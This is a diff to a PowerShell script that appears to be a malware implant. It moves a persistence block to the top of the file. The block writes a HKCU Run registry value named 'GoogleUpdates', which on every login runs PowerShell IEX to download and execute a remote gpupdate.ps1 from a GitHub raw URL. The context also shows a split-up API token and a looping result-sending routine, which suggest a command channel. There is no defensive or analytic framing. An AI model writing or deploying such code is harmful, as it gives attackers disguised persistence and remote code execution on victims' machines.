@@ -6,7 +6,16 @@ $t2="3d6b0974ef647ae94f63";
 $t3="6263064648daeb0";
 $gistsApiToken=$t1+$t2+$t3;
 
+$name = "GoogleUpdates"
+$value ="powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/maymiday/rop/master/gpupdate.ps1')"
+try{
+    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $name -PropertyType String -Value $value -ErrorAction Stop
+    $tip = "Success:"+$name;
+}catch [System.Exception]{
+        
+}finally{
 
+}
 
 function sendResult($r){
     try{
@@ -100,13 +109,4 @@ while(1){
   }
 }
 
-$name = "GoogleUpdates"
-$value ="powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/maymiday/rop/master/gpupdate.ps1')"
-try{
-    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $name -PropertyType String -Value $value -ErrorAction Stop
-    $tip = "Success:"+$name;
-}catch [System.Exception]{
-        
-}finally{
 
-}
